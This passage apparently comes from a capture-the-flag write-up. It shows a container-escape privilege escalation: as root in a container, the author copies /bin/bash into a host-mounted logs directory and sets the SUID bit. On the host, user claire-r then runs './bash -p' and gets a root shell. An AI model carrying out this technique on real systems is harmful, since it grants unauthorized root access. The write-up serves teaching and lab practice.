@@ -822,3 +822,30 @@ claire-r@ip-10-114-163-190:~/timeTracker-src/logs$
 ```
 
 
+``` bash
+
+root@de0610f51845:/logs# cp /bin/bash .
+root@de0610f51845:/logs# chmod 4777 bash
+root@de0610f51845:/logs# chmod u+s bash
+root@de0610f51845:/logs#
+
+```
+
+
+``` bash
+
+claire-r@ip-10-114-163-190:~/timeTracker-src/logs$ ls -la
+total 1224
+drwxrw-rw- 2 claire-r claire-r    4096 Sep  3 09:39 .
+drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
+-rwsrwxrwx 1 root     root     1234376 Sep  3 09:39 bash
+-rw-r--r-- 1 root     root          17 Sep  3 09:34 mount.txt
+-rw-r--r-- 1 root     root         531 Sep  3 09:14 tt.log
+claire-r@ip-10-114-163-190:~/timeTracker-src/logs$ ./bash -p
+bash-5.1# whoami
+root
+bash-5.1#
+
+```
+
+
